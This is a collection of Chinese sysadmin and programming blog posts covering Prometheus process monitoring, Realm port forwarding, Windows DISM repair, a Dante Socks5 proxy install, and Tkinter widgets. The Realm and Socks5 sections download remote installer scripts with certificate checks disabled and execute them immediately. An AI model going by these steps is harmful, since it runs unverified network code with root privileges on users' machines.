https://github.com/ncabatoff/process-exporter/releases/download/v0.7.10/process-exporter-0.7.10.linux-amd64.tar.gztar zxvf process-exporter-0.7.10.linux-amd64.tar.gzmv process-exporter-0.7.10.linux-amd64 /usr/local/Prometheus/process_exporterls -l /usr/local/Prometheus/process_exporter 创建用户1useradd -M -s /usr/sbin/nologin prometheus 更改exporter文件夹权限1chown prometheus:prometheus -R /usr/local/Prometheus 创建配置文件监控所有进程 123456cat &gt;&gt;/usr/local/Prometheus/process_exporter/process.yml&lt;&lt;&quot;EOF&quot;process_names: - name: &quot;{{.Comm}}&quot; # 匹配模板 cmdline: - '.+' # 匹配名称EOF 创建systemd123456789101112131415cat &lt;&lt;&quot;EOF&quot; &gt;/etc/systemd/system/process_exporter.service[Unit]Description=process_exporterAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusExecStart=/usr/local/Prometheus/process_exporter/process-exporter -config.path=/usr/local/Prometheus/process_exporter/process.ymlRestart=on-failure[Install]WantedBy=multi-user.targetEOF 启动123systemctl daemon-reloadsystemctl start process_exporter 加入到开机自启动1systemctl enable process_exporter 检查1systemctl status process_exporter 启动不了检查日志 1journalctl -u process_exporter -f 查看 1http://192.168.224.12:9256/metrics 2、docker安装创建数据目录 12mkdir /data/process_exporter -pcd /data/process_exporter 创建配置文件 Process-Exporter 的做法是配置需要监控的进程的名称，他会去搜索该进程从而得到其需要的监控信息，其实也就是我们常做的 ps -efl | grep xxx 命令来查看对应的进程。 监控所有进程 123456cat &gt;&gt;process.yml &lt;&lt;&quot;EOF&quot;process_names: - name: &quot;{{.Comm}}&quot; # 匹配模板 cmdline: - '.+' # 匹配所有名称EOF 监控指定进程 12345678910111213141516171819process_names:# - name: &quot;{{.Comm}}&quot;# cmdline:# - '.+' - name: &quot;{{.Matches}}&quot; cmdline: - 'nginx' #唯一标识 - name: &quot;{{.Matches}}&quot; cmdline: - 'mongod' - name: &quot;{{.Matches}}&quot; cmdline: - 'mysqld' - name: &quot;{{.Matches}}&quot; cmdline: - 'redis-server' docker运行 1docker run -d --rm -p 9256:9256 --privileged -v /proc:/host/proc -v `pwd`:/config --name process-exporter ncabatoff/process-exporter --procfs /host/proc -config.path /config/process.yml 检查 1http://192.168.224.12:9256/metrics 配置说明匹配模板 12345678910参数 解释 {{.Comm}} 包含原始可执行文件的名称，即/proc/&lt;pid&gt;/stat&lt;/pid&gt; {{.ExeBase}} 包含可执行文件的名称(默认) {{.ExeFull}} 包含可执行文件的路径 {{.Username}} 包含的用户名 {{.Matches}} 包含所有正则表达式而产生的匹配项（建议使用） {{.PID}} 包含进程的PID，一个PID仅包含一个进程（不建议使用） {{.StartTime}} 包含进程的开始时间（不建议使用） 3、Prometheus设置1cd /data/docker-prometheus 使用cat追加 1234567cat &gt;&gt; prometheus/prometheus.yml &lt;&lt;&quot;EOF&quot; - job_name: 'process' scrape_interval: 30s scrape_timeout: 15s static_configs: - targets: ['192.168.224.12:9256']EOF 重新加载配置1curl -X POST http://localhost:9090/-/reload 检查12http://192.168.224.11:9090/targets?search= 4、metrics说明1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859namedprocess_namedprocess_namegroup_states{state=&quot;Zombie&quot;} 查看僵尸# 上下文切换数量# Counternamedprocess_namegroup_context_switches_total# CPU user/system 时间（秒）# Counternamedprocess_namegroup_cpu_seconds_total# 主要页缺失次数# Counternamedprocess_namegroup_major_page_faults_total# 次要页缺失次数# Counternamedprocess_namegroup_minor_page_faults_total# 内存占用（byte）# Gaugenamedprocess_namegroup_memory_bytes# 同名进程数量# Gaugenamedprocess_namegroup_num_procs# 同名进程状态分布# Gaugenamedprocess_namegroup_states# 线程数量# Gaugenamedprocess_namegroup_num_threads# 启动时间戳# Gaugenamedprocess_namegroup_oldest_start_time_seconds# 打开文件描述符数量# Gaugenamedprocess_namegroup_open_filedesc# 打开文件数 / 允许打开文件数# Gaugenamedprocess_namegroup_worst_fd_ratio# 读数据量（byte）# Counternamedprocess_namegroup_read_bytes_total# 写数据量（byte）# Counternamedprocess_namegroup_write_bytes_total# 内核wchan等待线程数量# Gaugenamedprocess_namegroup_threads_wchan 常用指标 指标名 解释 namedprocess_namegroup_num_procs 运行的进程数 namedprocess_namegroup_states Running/Sleeping/Other/Zombie状态的进程数 namedprocess_namegroup_cpu_seconds_total 获取/proc/[pid]/stat 进程CPU utime、stime状态时间 namedprocess_namegroup_read_bytes_total 获取/proc/[pid]/io 进程读取字节数 namedprocess_namegroup_write_bytes_total 获取/proc/[pid]/io 进程写入字节数 namedprocess_namegroup_memory_bytes 获取进程使用的内存字节数 namedprocess_namegroup_open_filedesc 获取进程使用的文件描述符数量 namedprocess_namegroup_thread_count 运行的线程数 namedprocess_namegroup_thread_cpu_seconds_total 获取线程CPU状态时间 namedprocess_namegroup_thread_io_bytes_total 获取线程IO字节数 5、触发器Prometheus配置 1234# 报警(触发器)配置rule_files: - &quot;alert.yml&quot; - &quot;rules/*.yml&quot; 添加触发器（告警规则）12345678910111213141516171819202122232425262728293031323334353637cat &gt; prometheus/rules/process.yml &lt;&lt;&quot;EOF&quot;groups:- name: process rules: - alert: 进程数多告警 expr: sum(namedprocess_namegroup_states) by (instance) &gt; 1000 for: 1m labels: severity: warning annotations: summary: &quot;进程数超过1000&quot; description: &quot;服务器当前有{{ $value }}个进程&quot; - alert: 僵尸进程数告警 expr: sum by(instance, groupname) (namedprocess_namegroup_states{state=&quot;Zombie&quot;}) &gt; 0 for: 1m labels: severity: warning annotations: summary: &quot;有僵尸进程数&quot; description: &quot;进程{{ $labels.groupname }}有{{ $value }}个僵尸进程&quot; - alert: 进程重启告警 expr: ceil(time() - max by(instance, groupname) (namedprocess_namegroup_oldest_start_time_seconds)) &lt; 60 for: 15s labels: severity: warning annotations: summary: &quot;进程重启&quot; description: &quot;进程{{ $labels.groupname }}在{{ $value }}秒前重启过&quot; - alert: 进程退出告警 expr: max by(instance, groupname) (delta(namedprocess_namegroup_oldest_start_time_seconds{groupname=~&quot;^java.*|^nginx.*&quot;}[1d])) &lt; 0 for: 1m labels: severity: warning annotations: summary: &quot;进程退出&quot; description: &quot;进程{{ $labels.groupname }}退出了&quot;EOF 重新加载配置1curl -X POST http://localhost:9090/-/reload 检查1http://192.168.224.11:9090/alerts?search= 6、Doshboard1https://grafana.com/grafana/dashboards/8378-system-processes-metrics/ 问题下面2个图形显示不正常 process-exporter 升级到 0.5.0后 ,namedprocess_namegroup_cpu_user_seconds_total和namedprocess_namegroup_cpu_system_seconds_total合为一个指标名namedprocess_namegroup_cpu_seconds_total namedprocess_namegroup_cpu_user_seconds_total变成namedprocess_namegroup_cpu_seconds_total{mode=&quot;system&quot;} namedprocess_namegroup_cpu_system_seconds_total变成namedprocess_namegroup_cpu_seconds_total{mode=&quot;user&quot;} 指标 监控项含义 单位 说明 namedprocess_namegroup_cpu_seconds_total{mode=”system”} 当前内核空间占用CPU百分比。 % 系统上下文切换的消耗。如果该监控项数值比较高，则说明服务器开了太多的进程或线程。 namedprocess_namegroup_cpu_seconds_total{mode=”user”} 当前用户空间占用CPU百分比。 % 用户进程对CPU的消耗。 解决Top processes by System CPU cores used图形修改如下： 12345topk(5,rate(namedprocess_namegroup_cpu_seconds_total{mode=&quot;system&quot;,groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[$interval])or (irate(namedprocess_namegroup_cpu_seconds_total{mode=&quot;system&quot;,groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[5m]))) Top processes by Total CPU cores used图形修改如下 123topk(5,sum by (groupname,instance) (rate(namedprocess_namegroup_cpu_seconds_total{groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[$interval]))orsum by (groupname,instance) (irate(namedprocess_namegroup_cpu_seconds_total{groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[5m]))) 或图形改名为Top processes by User CPU cores used 用户进程cpu使用率排名 12345topk(5,rate(namedprocess_namegroup_cpu_seconds_total{mode=&quot;user&quot;,groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[$interval])or (irate(namedprocess_namegroup_cpu_seconds_total{mode=&quot;user&quot;,groupname=~&quot;$processes&quot;,instance=~&quot;$host&quot;}[5m]))) 修改完成后，图行正常","link":"/2023/05/08/Prometheus%E7%9B%91%E6%8E%A7%E8%BF%9B%E7%A8%8B/"},{"title":"Realm转发","text":"Realm转发github项目 1https://github.com/zhboner/realm 特点 支持DDNS 只要传入一个域名，那么就能自动后台更新解析。 支持DDNS 只要传入一个域名，那么就能自动后台更新解析。 高效，低消耗 依托于Rust语言，Realm保证内存安全。另外，相较于采用Go语言编写的Brook和gost，Realm执行速度更快，资源占用更低，非常适合在低配置的主机上使用。 简单 相较于使用iptables动辄几条复杂的命令，Realm仅需一条命令就能启动，保证了部署的方便。 UDP + TCP 无需额外的工作，Realm就能同时转发UDP和TCP。 安装Realm1234mkdir /etc/realm &amp;&amp; cd /etc/realm wget https://github.com/zhboner/realm/releases/download/v2.3.4/realm-x86_64-unknown-linux-musl.tar.gz tar xf realm-x86_64-unknown-linux-musl.tar.gz 直接运行 1234# -l 指定监听的本机地址和端口，地址可以省略，但必须指定端口。不指定地址的话会使用默认的 127.0.0.1 地址。# -r 指定转发的目的地址和端口，均不能省略。/etc/realm/realm -l 中转机IP:端口 -r 落地机IP或域名:端口示列: ./realm -l 0.0.0.0:9004 -r 44.92.103.211:33189 配置文件 https://github.com/zhboner/realm/blob/master/examples Realm支持json和toml两种格式。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152vim /etc/realm/config.toml# 最简配置[[endpoints]]listen = &quot;0.0.0.0:5000&quot;remote = &quot;1.2.3.4:443&quot;[[endpoints]]listen = &quot;0.0.0.0:6000&quot;remote = &quot;5.6.7.8:443&quot;# 常用配置[network]use_udp = truezero_copy = true[[endpoints]]listen = &quot;0.0.0.0:5000&quot;remote = &quot;1.2.3.4:443&quot;[[endpoints]]listen = &quot;0.0.0.0:6000&quot;remote = &quot;5.6.7.8:443&quot;# 完整配置[dns]mode = &quot;ipv4_only&quot;protocol = &quot;tcp_and_udp&quot;nameservers = [&quot;1.1.1.1:53&quot;, &quot;1.0.0.1:53&quot;]min_ttl = 600max_ttl = 3600cache_size = 256[network]use_udp = truezero_copy = truefast_open = truetcp_timeout = 300udp_timeout = 30send_proxy = falsesend_proxy_version = 2accept_proxy = falseaccept_proxy_timeout = 5[[endpoints]]listen = &quot;0.0.0.0:5000&quot;remote = &quot;1.2.3.4:443&quot;[[endpoints]]listen = &quot;0.0.0.0:6000&quot;remote = &quot;5.6.7.8:443&quot; json格式示列 12345678910111213141516171819202122232425262728vim /etc/realm/config.json{ &quot;endpoints&quot;: [ { &quot;listen&quot;: &quot;0.0.0.0:9001&quot;, &quot;remote&quot;: &quot;6.164.153.76:9000&quot; }, { &quot;listen&quot;: &quot;0.0.0.0:9002&quot;, &quot;remote&quot;: &quot;13.219.30.20:9000&quot; }, { &quot;listen&quot;: &quot;0.0.0.0:9003&quot;, &quot;remote&quot;: &quot;15.238.251.170:9000&quot; }, { &quot;listen&quot;: &quot;0.0.0.0:9004&quot;, &quot;remote&quot;: &quot;13.219.30.115:9000&quot; }, { &quot;listen&quot;: &quot;0.0.0.0:10001&quot;, &quot;remote&quot;: &quot;6.164.153.67:9000&quot; } ]}#注意大括号}结尾不能有逗号[,] ,否则会导致启动不了服务。 设置系统开机启动 123456789101112131415161718vim /etc/systemd/system/realm.service[Unit]Description=realmAfter=network-online.targetWants=network-online.target systemd-networkd-wait-online.service[Service]Type=simpleUser=rootRestart=on-failureRestartSec=5sDynamicUser=trueWorkingDirectory=/etc/realmExecStart=/etc/realm/realm -c /etc/realm/config.toml[Install]WantedBy=multi-user.target 启动 1234systemctl daemon-reloadsystemctl enable realmsystemctl restart realmsystemctl status realm Realm一键脚本 https://github.com/seal0207/EasyRealM 1wget -N --no-check-certificate https://git.io/realm.sh &amp;&amp; chmod +x realm.sh &amp;&amp; ./realm.sh","link":"/2022/06/05/Realm%E8%BD%AC%E5%8F%91/"},{"title":"Win10系统缺损文件或者文件丢失修复方法","text":"Win10系统缺损文件或者文件丢失的修复方法Win10有时候会更新失败，主要原因无非两种，一种是文件下载失败，这属于网络传输问题；另一个就是对比文件校验失败，另外有些人使用Win10的时候会发现，有些软件安装完之后Win10会一定几率报错，原因就是系统文件被替换掉了，校验后报错。主要原因是经常会受到一些第三方程序、恶意插件、广告和病毒的影响，出现诸如：应用不能打开，闪退，缺少XX文件等错误提示的现象。 DISM，英文全称：Deployment Image Servicing and Management，中文称之为：部署映像服务和管理。它是一个命令行工具，可用于维护和准备 Windows 映像。咱们今天介绍的，就是里面的一部分用来检查系统文件完整性和修复系统文件的命令 1、首先，以管理员方式运行cmd，进入到命令行运行环境，开始相应的DIMS命令使用。 2、查看映像版本：Dism /online /Get-CurrentEdition可以看到当前的系统版本和版本类型。 12dism 可以查看其它命令解释Dism /online /Get-CurrentEdition 3、扫描映像，查看映像是否有损坏（有损坏时电脑会遇到许多小问题，比如可能无法更新系统，无法打开运行一些软件）这里有进度条显示，以及提示是否有损坏。 1Dism /Online /Cleanup-Image /ScanHealth 一般需要几分钟时间,如果没有问题，会出现下面的界面。 通过这个命令也可以查看损坏程度 1Dism /Online /Cleanup-Image /CheckHealth DISM工具将报告映像是状态良好、可以修复、还是不可修复。如果映像不可修复，可能无法完成后续修复操作，可以再来尝试下载微软易升工具更新系统到最新版或是干净重装。如果映像可以修复，可以使用 /RestoreHealth参数来修复映像。 4、修复系统映像文件 1Dism /Online /Cleanup-Image /RestoreHealth 校验文件如果不是100%，说明有些系统文件被其他软件安装时替换过了。 这是通过Windows 更新来修复当前受损的系统文件，根据当前网络和微软服务器的网络情况，需要的时间不等。如果无法通过联网更新修复，建议更换网络环境尝试。 5、如果仍然无法通过联网修复，我们有Win10系统的ISO安装映像文件，可以通过以下命令从本地映像源完成修复：Dism /Online /Cleanup-Image /RestoreHealth /source:wim:X:\\sources\\install.wim:1 /limitaccess 1Dism /Online /Cleanup-Image /RestoreHealth /source:wim:F:\\sources\\install.wim:1 /limitaccess 具体这个路径 X:\\sources\\install.wim 怎么确认呢？ 首先我们在Win10系统里面，右键ISO文件，选择装载，相当于打开一个虚拟光驱文件。 然后点击文件资源管理器上方的地址栏，就可以看到这个盘符是F，因此我们在前面的这个路径X:\\sources\\install.wim替换为F:\\sources\\install.wim即可。完成之后记得弹出ISO文件 一般经过上面的步骤后，最后还可以使用SFC命令工具来协助修复系统：SFC /SCANNOW 。这个命令视系统性能要运行一定的时间，5-10分钟才可以全部完成，如果系统正常，会提示未找到完整性冲突。如果在扫描中发现了异常，该命令会自动调用完成修复。 1SFC /SCANNOW 以上就是不重装系统，修复Win10系统缺损文件或者文件丢失的修复方法，如果有用的话，建议收藏备用。","link":"/2020/08/03/Win10%E7%B3%BB%E7%BB%9F%E7%BC%BA%E6%8D%9F%E6%96%87%E4%BB%B6%E6%88%96%E8%80%85%E6%96%87%E4%BB%B6%E4%B8%A2%E5%A4%B1%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/"},{"title":"Ubuntu/Debian/CentOS搭建Socks5代理一键脚本","text":"Ubuntu/Debian/CentOS搭建Socks5代理一键脚本说明Socks5属于明文代理，不要用于科学上网，否则会被阻断端口，可用于正常的跳板使用；比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS；使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题； 安装下载脚本 1wget --no-check-certificate https://raw.github.com/Lozy/danted/master/install.sh -O install.sh 安装脚本 1bash install.sh --port=端口 --user=用户名 --passwd=密码 其中的端口 用户名 密码自行修改后粘贴到SSH里运行安装即可；完成后会提示Dante Server Install Successfuly即表示安装成功；安装后如果连接不上，检查设置的端口是否已经放行；说明：安装完成后会显示内网IP地址，但在实际使用的时候需要用外网IP地址； 使用一般使用IP和用户名密码即可使用如果需要固定IP或IP段，可以修改配置文件设置白名单 1vi /etc/danted/sockd.conf 修改以下代码，改成你需要设置的白名单IP或IP段即可，然后重启使其生效； 123client pass { from: 0.0.0.0/0 to: 0.0.0.0/0} 卸载1bash install.sh --uninstall 命令 命令 或者 说明 service sockd start /etc/init.d/sockd start 启动socks5服务器守护进程 service sockd stop /etc/init.d/sockd stop 停止socks5服务器守护进程 service sockd restart /etc/init.d/sockd restart 重新启动socks5服务器守护进程 service sockd reload /etc/init.d/sockd reload 重新加载socks5服务器守护进程 service sockd status / 系统进程状态 service sockd state /etc/init.d/sockd state 运行状态 service sockd tail /etc/init.d/sockd tail sock 日志 service sockd adduser /etc/init.d/sockd adduser 添加pam-auth用户：service sockd adduser NAME PASSWORD service sockd deluser /etc/init.d/sockd deluser 删除pam-auth用户：service sockd deluser NAME","link":"/2022/05/28/Ubuntu_Debian_CentOS%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC/"},{"title":"python3之Tkinter的使用","text":"一，tkinter使用1,tkinter介绍Tkinter模块(“Tk 接口”)是Python的标准Tk GUI工具包的接口，TK和Tkinter可以在大多数的Unix平台下使用，同样可以应用在Windows和Max系统里，Tk8.0的后续版本可以实现本地窗口风格，并良好的运行在绝大多数平台中， Tkinter是内置到python的安装包中、只要安装好Python之后就能import tkinter库，而且IDLE也是用Tkinter编写而成 步骤 1，导入Tkinter模块 2，创建控件 3，指定这个控件的master,即这个控件属于哪一个 4， 告诉GM(geometry manager)有一个控件产生了 2，tkinter使用0,Tkinter组件123456789101112Label 显示文本 Button 显示按钮 Entry 输入内容 Text 显示多行文本 CheckButton 多选框控件按钮 RadioButton 单选框控件Listbox 列表框控件Scale 供用户通过拖拽指示器改变变量的值Spinbox 数值范围控件Menu 顶层菜单，常用Combobox 下拉控件Frame 框架容器控件 1，创建示列123456789101112131415161718import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#进入消息循环 win.mainloop() 2,labe控件显示文本1234567891011121314151617181920212223242526272829303132333435363738394041import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#进入消息循环'''Laber:标签控件可以显示文本'''#win: 父窗体#text 显示的文本内容#bg 背景色#fg 字体颜色#wraplength 指定text文本中多宽进行换行#justify 设置换行后的对齐方法。left左对齐#anchor 位置 n北 e东 s南 w西 center 居中 ne东北 se东南 sw 西南 nw 西北 默认居中label = tkinter.Label(win, text= &quot;yichen &quot;, bg=&quot;blue&quot;, fg=&quot;red&quot;, font = (&quot;黑体&quot;,20), width = 20, height= 4, wraplength= 100, justify=&quot;left&quot;, anchor=&quot;nw&quot;)#显示出来label.pack()win.mainloop() 3,Button控件123456789101112131415161718192021222324252627282930import tkinterdef func(): print(&quot;yichen is a goo man &quot;)#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#进入消息循环button1 = tkinter.Button(win, text =&quot;按钮&quot;, command=func, width= 5 ,height = 1)button1.pack()button2 = tkinter.Button(win, text=&quot;按钮&quot;,command=lambda:print(&quot;yichenis a nice mam&quot;))button2.pack()#退出button3 = tkinter.Button(win, text=&quot;退出&quot;, command=win.quit)button3.pack()win.mainloop() 4,Entry控件输入内容，1234567891011121314151617181920212223242526272829303132import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''Entry输入控件用于显示简单的文本内容'''#绑定变量e = tkinter.Variable()#show 密文显示 显示的内容可以自定义 show=&quot;*&quot;entry = tkinter.Entry(win, textvariable= e )entry.pack()#e就代表输入框这个对象#设置值e.set(&quot;yichen is a good man&quot;)#取值 e.get() entry.get()print(e.get())print(entry.get())win.mainloop() 5,点击按钮输出输入框的内容1234567891011121314151617181920212223import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)def showInfo(): print(entry.get())entry = tkinter.Entry(win)entry.pack()button = tkinter.Button(win, text=&quot;按钮&quot; ,command = showInfo)button.pack()win.mainloop() 6, Text控件显示多行文本1234567891011121314151617181920212223242526272829import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''文本控件， 用于显示多行文本'''str = '''On behalf of the great state of Illinois, crossroads of a nation, land of Lincoln, let me express my deep gratitude for the privilege of addressing this convention. Tonight is a particular honor for me because, let's face it, my presence on this stage is pretty unlikely.'''#height显示的行数text = tkinter.Text(win, width = 30, height = 4)text.insert(tkinter.INSERT, str)text.pack()win.mainloop() 7，带滚动条的text123456789101112131415161718192021222324252627282930313233343536373839import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置#win.geometry(&quot;400x400+200+30&quot;)'''文本控件， 用于显示多行文本'''str = '''On behalf of the great state of Illinois, crossroads of a nation, land of Lincoln, let me express my deep gratitude for the privilege of addressing this convention. Tonight is a particular honor for me because, let's face it, my presence on this stage is pretty unlikely.'''#创建滚动条scroll = tkinter.Scrollbar()#height显示的行数text = tkinter.Text(win, width = 80, height = 4)#side放到窗体的哪一侧,RIGHT右侧 fill填充scroll.pack(side = tkinter.RIGHT, fill = tkinter.Y)text.pack(side = tkinter.LEFT, fill= tkinter.Y)#关联scroll.config(command=text.yview) #滚动条动控制文本动text.config(yscrollcommand=scroll.set) #文本动滚动条也关联着动text.insert(tkinter.INSERT, str)text.pack()win.mainloop() 8，多选框控件1234567891011121314151617181920212223242526272829303132333435import tkinterwin = tkinter.Tk()win.title(&quot;逸尘&quot;)win.geometry(&quot;400x400+200+20&quot;)def updata(): message =&quot;&quot; if hobby1.get() == True: message += &quot;money\\n&quot; if hobby2.get() == True: message +=&quot;power\\n&quot; if hobby3.get() == True: message += &quot;proson\\n &quot; #清除text中的所有内容 text.delete(0.0, tkinter.END) text.insert(tkinter.INSERT, message)#要绑定的变量hobby1 = tkinter.BooleanVar()#多选框check1 = tkinter.Checkbutton(win,text =&quot;money&quot;,variable = hobby1,command=updata)check1.pack()hobby2 = tkinter.BooleanVar()check2 = tkinter.Checkbutton(win,text =&quot;power&quot;,variable = hobby2,command=updata)check2.pack()hobby3 = tkinter.BooleanVar()check3 = tkinter.Checkbutton(win,text =&quot;person&quot;,variable = hobby3,command=updata)check3.pack()#多行文本宽度高度text = tkinter.Text(win, width= 50, height = 6)text.pack()win.mainloop() 9,单选框1234567891011121314151617181920212223242526272829303132import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)def updata(): print(r.get())#绑定变量 一组单选框要绑定同一个变量r = tkinter.IntVar()radio1 = tkinter.Radiobutton(win, text =&quot;one&quot;, value= 1,variable= r, command = updata)radio1.pack()radio2 = tkinter.Radiobutton(win, text =&quot;two&quot;, value= 2, variable = r, command= updata)radio2.pack()radio3 = tkinter.Radiobutton(win, text =&quot;two&quot;, value= 3, variable = r, command= updata)radio3.pack()win.mainloop() 10， Listbox列表框控件1 BROWSE模式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''列表框控件，可以包含一个或多个文本框作用： 在listbox控件的小窗口显示一个字符串'''#1,创建一个listbox,添加几个元素lb = tkinter.Listbox(win, selectmode=tkinter.BROWSE)lb.pack()for item in [&quot;item&quot;,&quot;nice&quot;, &quot;handsome&quot;]: #按顺序添加 lb.insert(tkinter.END, item) #在开始添加lb.insert(tkinter.ACTIVE, &quot;cool&quot;) #将列表当成一个元素添加的lb.insert(tkinter.ACTIVE, [&quot;very good&quot;, &quot;very nice&quot;])#删除 参数1为开始的索引，参数2为结束的索引，如果不指定参数2，只删除第一个索引的内容#lb.delete(1,3)#lb.delete(1)#选中 参数1为开始的索引，参数2为结束的索引，如果不指定参数2，只选中第一个索引处的内容#lb.select_set(2,5)#lb.select_set(2)#取消选中#lb.select_clear(2,4)#lb.select_clear(3)#获取到列表中的元素的个数#print(lb.size())#从列表中取值 参数1为开始的索引，参数2为结束的索引，如果不指定参数2，只获取第一个索引处的内容#print(lb.get(2,4))#print(lb.get(2))#返回当前选中的的索引项，不是item元素print(lb.curselection())#判断 一个选项是否被选中print(lb.selection_includes(1))print(lb.selection_includes(3))win.mainloop() 2， SINGLE模式，不支持鼠标移动选中 12345678910111213141516171819202122232425262728293031323334353637import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#绑定变量lbv = tkinter.StringVar()#与BORWSE相似，但是不支持鼠标移动选中的位置lb = tkinter.Listbox(win, selectmode=tkinter.SINGLE,listvariable=lbv)lb.pack()for item in [&quot;item&quot;,&quot;nice&quot;, &quot;handsome&quot;,&quot;vg&quot;,&quot;vn&quot;]: #按顺序添加 lb.insert(tkinter.END, item)#打印当前列表中的选项print(lbv.get( ))#设置选项#lbv.set((&quot;1&quot;,&quot;2&quot;,&quot;3&quot;))#绑定事件def myPrint(event): print(lb.get(lb.curselection())) #打印内容lb.bind(&quot;&lt;Double-Button-1&gt;&quot;,myPrint)win.mainloop() 3， EXTENDED模式，支持shift连选，和control多选 12345678910111213141516171819202122232425262728293031323334import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置#win.geometry(&quot;400x400+200+30&quot;)#绑定变量lbv = tkinter.StringVar()#EXTENDED 可以使listbox支持shift和Controllb = tkinter.Listbox(win, selectmode=tkinter.EXTENDED,listvariable=lbv)for item in [&quot;item&quot;,&quot;nice&quot;, &quot;handsome&quot;,&quot;vg&quot;,&quot;vn&quot;,&quot;good1&quot;,&quot;good2&quot;,&quot;hallo1&quot;,&quot;hello2&quot;,&quot;good2&quot;,&quot;hallo1&quot;,&quot;hello2&quot;]: #按顺序添加 lb.insert(tkinter.END, item)#按住shift,可以实现连选#按住control，可以实现多选#滚动条sc = tkinter.Scrollbar(win)sc.pack(side=tkinter.RIGHT,fill = tkinter.Y)lb.configure(yscrollcommand=sc.set)lb.pack(side=tkinter.LEFT,fill= tkinter.BOTH)sc['command'] = lb.yview win.mainloop() 4， MULTIPLE 模式 支持多选 123456789101112131415161718192021222324252627import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#绑定变量lbv = tkinter.StringVar()#MULTIPLE 支持多选lb = tkinter.Listbox(win, selectmode=tkinter.MULTIPLE,listvariable=lbv)lb.pack()for item in [&quot;item&quot;,&quot;nice&quot;, &quot;handsome&quot;,&quot;vg&quot;,&quot;vn&quot;]: #按顺序添加 lb.insert(tkinter.END, item)win.mainloop() 11，Scale控件123456789101112131415161718192021222324252627282930313233import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''供用户通过拖拽指示器改变变量的值，可以水平，也可以竖直tkinter.HORIZONTAL 水平方向tkinter.VERTICAL 竖直 默认length 水平是表示宽度，竖直是表示高度tickinterval 选择值将会为改值的倍数'''scale = tkinter.Scale(win, from_=0 ,to = 100, orient = tkinter.HORIZONTAL,tickinterval = 100, length= 200)scale.pack()#设置值scale.set(20)def showNum(): print(scale.get())tkinter.Button(win, text=&quot;打印&quot;, command=(showNum)).pack()win.mainloop() 12, Spinbox 数值范围控件1234567891011121314151617181920212223242526272829303132333435import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''数值范围控件to是最大值from_最小值increment 步长，默认是1'''# values 最好不要与from_=0,to=100,increment = 2同时使用def updata(): print(v.get())#command 只要值改变就会执行对应的方法v = tkinter.StringVar()sp = tkinter.Spinbox(win,from_=0 , to = 100,increment = 2 ,textvariable=v,command= updata)#sp = tkinter.Spinbox(win,values=(0,2,4,6,8) )sp.pack()#设置值v.set(20)#取值print(v.get())win.mainloop() 13,Menu菜单1,顶层菜单 1234567891011121314151617181920212223242526272829303132333435363738394041424344import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)v = tkinter.StringVar()#菜单条menubar = tkinter.Menu(win)win.config(menu=menubar)def func(): print(&quot;逸尘 is a good man&quot;)#创建一个菜单选项menu1 = tkinter.Menu(menubar,tearoff=False)menu2 = tkinter.Menu(menubar,tearoff=False)#给菜单选项添加内容for item in [&quot;Python&quot;,&quot;C&quot;,&quot;C++&quot;,&quot;oc&quot;, &quot;Swift&quot;,&quot;C#&quot;,&quot;shell&quot;,&quot;Java&quot;, &quot;JS&quot;, &quot;PHP&quot;,&quot;汇编&quot;,&quot;NodeJs&quot;,&quot;退出&quot;]: if item == &quot;退出&quot;: #添加分隔线 menu1.add_separator() menu1.add_command(label=item, command=win.quit) else: menu1.add_command(label=item,command = func)#向菜单条添加菜单选项menubar.add_cascade(label=&quot;语言&quot;, menu=menu1)menu2.add_command(label=&quot;red&quot;)menu2.add_command(label=&quot;blue&quot;)menu2.add_command(label=&quot;green&quot;)menubar.add_cascade(label=&quot;颜色&quot;, menu=menu2)win.mainloop() 2，鼠标右击菜单 